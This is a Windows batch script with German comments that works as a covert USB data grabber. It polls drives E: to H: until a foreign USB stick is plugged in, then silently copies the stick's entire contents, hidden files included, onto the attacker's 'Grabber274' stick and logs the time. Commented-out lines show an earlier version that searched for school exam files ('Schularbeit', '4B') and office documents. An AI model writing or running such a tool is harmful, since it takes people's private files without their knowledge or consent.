@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
rem mode con lines=1 cols=15

REM Nun nach USB Stick suchen (eigenen USB (Ordner filtern) auslassen)
:research
if exist "F:\" if not exist "F:\Grabber274\" set usb=F:\&goto copy
if exist "G:\" if not exist "G:\Grabber274\" set usb=G:\&goto copy
if exist "H:\" if not exist "H:\Grabber274\" set usb=H:\&goto copy
if exist "E:\" if not exist "E:\Grabber274\" set usb=E:\&goto copy
timeout 5 /NOBREAK >NUL
goto research

:copy
cd %usb%
REM Noch Grabber USB rausfinden
if exist "E:\Grabber274\DATA\" set grabber=E:\Grabber274\DATA\&goto procedure
if exist "F:\Grabber274\DATA\" set grabber=F:\Grabber274\DATA\&goto procedure
if exist "G:\Grabber274\DATA\" set grabber=G:\Grabber274\DATA\&goto procedure
if exist "H:\Grabber274\DATA\" set grabber=H:\Grabber274\DATA\&goto procedure
echo Fatal_Error 0001: Ordner fehlerhaft benannt. >> "Error.wsdt"
exit

:procedure
rem soll pfad ausgeben zum kopieren
REM for /f "delims=" %%A in ('findstr /i /s "SA" "%usb%"') do xcopy /S /C /I /H /Y "%%A" "%grabber%"
REM for /f "delims=" %%B in ('findstr /i /s "Schularbeit" "%usb%"') do xcopy  /S /C /I /H /Y "%%B" "%grabber%"
REM for /f "delims=" %%C in ('findstr /i /s "4B" "%usb%"') do xcopy  /S /C /I /H /Y "%%C" "%grabber%"
REM for /f "delims=" %%D in ('findstr /i /s ".docx" "%usb%"') do xcopy  /S /C /I /H /Y "%%D" "%grabber%"
REM for /f "delims=" %%E in ('findstr /i /s ".xlsx" "%usb%"') do xcopy  /S /C /I /H /Y "%%E" "%grabber%"
echo USB wird kopiert (%date%, %time%) >> Log.wsdt
xcopy  /S /C /I /H /Y "%usb%*.*" "%grabber%"
echo USB wurde vollstaendig uebertragen (%date%, %time%) >> Log.wsdt
exit
